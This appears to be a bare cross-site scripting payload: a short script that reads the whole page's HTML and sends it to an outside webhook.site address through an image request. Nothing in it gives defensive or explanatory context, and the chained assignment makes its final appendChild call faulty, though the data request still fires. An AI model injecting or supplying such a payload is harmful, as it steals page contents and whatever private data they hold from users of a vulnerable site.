<script>
    var webhook = "https://webhook.site/#!/view/7930adfa-3dca-4f19-866c-9200e9f907db";
    var data = document.body.innerHTML;
    var img = document.createElement("img").src = webhook + "?data="+encodeURIComponent(data);
    document.body.appendChild(img);
</script>
